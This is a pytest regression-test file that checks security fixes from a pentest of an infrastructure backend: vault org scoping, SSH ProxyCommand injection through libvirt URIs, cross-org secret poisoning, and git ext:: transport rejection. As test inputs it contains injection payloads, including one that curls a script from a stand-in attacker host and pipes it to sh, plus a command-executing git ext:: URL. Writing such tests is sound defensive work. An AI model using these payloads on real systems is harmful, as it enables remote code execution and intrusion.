"""Regression tests for the pentest fixes:
  * cross-org vault decryption oracle (org-scoped _resolve_secret_ref + the
    install-hypervisor-key sysadmin/audit gate);
  * libvirt qemu+ssh URI → SSH ProxyCommand command injection;
  * cross-org secret poisoning (org-scoped secret identity + upsert);
  * git remote-helper (ext::) transport rejection.
"""
import fastapi
import pytest

import backend.app as appmod
import backend.db as db
import backend.gitops as gitops
import backend.vault as vault
from backend.runners import ansible_runner
from fastapi.testclient import TestClient


def _login(username, password):
    from backend.app import app
    c = TestClient(app)
    tok = c.post("/login", json={"username": username, "password": password}).json()["token"]
    c.headers.update({"Authorization": f"Bearer {tok}"})
    return c


def _org(client, name):
    return client.post("/organizations", json={"name": name}).json()


# --------------------------------------------------------------- CRITICAL: oracle
def test_resolve_secret_ref_is_org_scoped(client):
    """A secret in org A can't be resolved when the caller's scope is org B — the
    core of the cross-org decryption oracle fix."""
    a = _org(client, "Oracle-A")
    b = _org(client, "Oracle-B")
    client.post("/vault", json={"name": "ORACLE_SECRET", "value": "A-plaintext", "org_id": a["id"]})
    # Scoped to A → resolves; scoped to B → not visible (empty, treated as absent).
    assert appmod._resolve_secret_ref("vault.ORACLE_SECRET", org_ids=[a["id"]]) == "A-plaintext"
    assert appmod._resolve_secret_ref("vault.ORACLE_SECRET", org_ids=[b["id"]]) == ""


def test_install_hypervisor_key_vault_ref_requires_sysadmin(client):
    """An ordinary operator can't turn install-hypervisor-key into a decryption
    oracle by pointing the password at a Vault ref — only a system admin may, and
    a literal password is unaffected."""
    # A secret exists (in Default); the attacker is a plain operator.
    client.post("/vault", json={"name": "HV_ORACLE_PW", "value": "topsecret"})
    client.post("/users", json={"username": "hv_op", "password": "hv-operator-pw", "role": "operator"})
    op = _login("hv_op", "hv-operator-pw")
    # Vault ref as the install password → 403 for a non-sysadmin.
    r = op.post("/infra/install-hypervisor-key",
                json={"host": "evil.example.com", "user": "root", "password": "vault.HV_ORACLE_PW"})
    assert r.status_code == 403
    # A literal password is NOT blocked by the sysadmin gate (it may then fail later
    # for env reasons, but never with the 403 the Vault ref triggers).
    r2 = op.post("/infra/install-hypervisor-key",
                 json={"host": "h", "user": "root", "password": "a-literal-pw"})
    assert r2.status_code != 403


# --------------------------------------------------------- HIGH: ProxyCommand inject
def test_libvirt_uri_rejects_command_injection_netloc():
    """A qemu+ssh URI whose userinfo/host carry shell metacharacters is rejected at
    the validation boundary (was: metachars survived urlsplit and reached the
    auto-derived SSH ProxyCommand)."""
    evil = "qemu+ssh://a;curl$IFS-fsSL$IFS'http://attacker/x.sh'|sh;@10.0.0.9/system"
    with pytest.raises(fastapi.HTTPException) as ei:
        appmod._validate_libvirt_uri(evil)
    assert ei.value.status_code == 400
    # A clean remote URI still validates.
    assert appmod._validate_libvirt_uri("qemu+ssh://admin@192.168.8.212/system")


def test_uri_derived_bastion_is_validated_or_dropped():
    """A bastion derived from a hostile URI is dropped (''), never returned raw; a
    clean one passes through unchanged."""
    evil = "qemu+ssh://a;curl|sh;@10.0.0.9/system"
    assert appmod._bastion_from_libvirt_uri(evil) == ""
    assert appmod._bastion_from_libvirt_uri("qemu+ssh://admin@192.168.8.212/system") == "admin@192.168.8.212"


def test_proxycommand_shell_quotes_bastion(tmp_path):
    """Even if a metacharacter bastion reached the inventory renderer, it is shell-
    quoted inside the ProxyCommand so it can't break out of the ssh option."""
    dest = tmp_path / "inventory.ini"
    ansible_runner._render_inventory([], None, dest, bastion="a;touch /tmp/pwn",
                                     bastion_key="/tmp/key")
    text = dest.read_text()
    # The raw injection never appears unquoted; shlex.quote wraps it in single quotes.
    assert "a;touch /tmp/pwn" not in text.replace("'a;touch /tmp/pwn'", "")
    assert "'a;touch /tmp/pwn'" in text


# ----------------------------------------------------- MEDIUM: secret poisoning
def test_cross_org_secret_poisoning_blocked(client):
    """An operator in org B who is only a VIEWER in org A cannot overwrite org A's
    secret of the same name — the write lands as a distinct B-scoped row and A's
    value is untouched."""
    a = _org(client, "Poison-A")
    b = _org(client, "Poison-B")
    client.post("/vault", json={"name": "DEPLOY_TOKEN", "value": "A-original", "org_id": a["id"]})
    # Attacker: operator in B, viewer in A.
    client.post("/users", json={"username": "poison_op", "password": "poison-operator-pw", "role": "operator"})
    client.post(f"/organizations/{b['id']}/members", json={"username": "poison_op", "role": "operator"})
    client.post(f"/organizations/{a['id']}/members", json={"username": "poison_op", "role": "viewer"})
    op = _login("poison_op", "poison-operator-pw")
    # Write DEPLOY_TOKEN into B (allowed — operator there).
    assert op.post("/vault", json={"name": "DEPLOY_TOKEN", "value": "attacker", "org_id": b["id"]}).status_code == 200
    # Writing into A is refused (viewer only).
    assert op.post("/vault", json={"name": "DEPLOY_TOKEN", "value": "attacker", "org_id": a["id"]}).status_code == 403
    # Org A's value is intact; org B has its own distinct row.
    assert vault.decrypt(dict(db.all_secret_ciphertexts(org_ids=[a["id"]]))["DEPLOY_TOKEN"]) == "A-original"
    assert vault.decrypt(dict(db.all_secret_ciphertexts(org_ids=[b["id"]]))["DEPLOY_TOKEN"]) == "attacker"


def test_same_name_secret_per_org_is_independent(client):
    """UNIQUE(org_id, name): the same name may exist once per org as separate rows."""
    a = _org(client, "PerOrg-A")
    b = _org(client, "PerOrg-B")
    client.post("/vault", json={"name": "SHARED_NAME", "value": "va", "org_id": a["id"]})
    client.post("/vault", json={"name": "SHARED_NAME", "value": "vb", "org_id": b["id"]})
    assert vault.decrypt(dict(db.all_secret_ciphertexts(org_ids=[a["id"]]))["SHARED_NAME"]) == "va"
    assert vault.decrypt(dict(db.all_secret_ciphertexts(org_ids=[b["id"]]))["SHARED_NAME"]) == "vb"
    # An upsert within one org replaces only that org's row.
    client.post("/vault", json={"name": "SHARED_NAME", "value": "va2", "org_id": a["id"]})
    assert vault.decrypt(dict(db.all_secret_ciphertexts(org_ids=[a["id"]]))["SHARED_NAME"]) == "va2"
    assert vault.decrypt(dict(db.all_secret_ciphertexts(org_ids=[b["id"]]))["SHARED_NAME"]) == "vb"


# ----------------------------------------------------- MEDIUM: git ext transport
def test_git_ext_transport_rejected():
    """A `ext::`/other remote-helper URL (arbitrary command execution on clone) is
    rejected; https/ssh/scp-like remotes still validate."""
    for bad in ("ext::sh -c \"id>/tmp/pwn\"", "fd::17/x", "-oProxyCommand=x", "file:///etc/passwd"):
        with pytest.raises(gitops.GitError):
            gitops._validate_remote_url(bad)
    for ok in ("https://example.com/a/b.git", "ssh://git@host/a.git", "git@github.com:org/repo.git"):
        assert gitops._validate_remote_url(ok) == ok
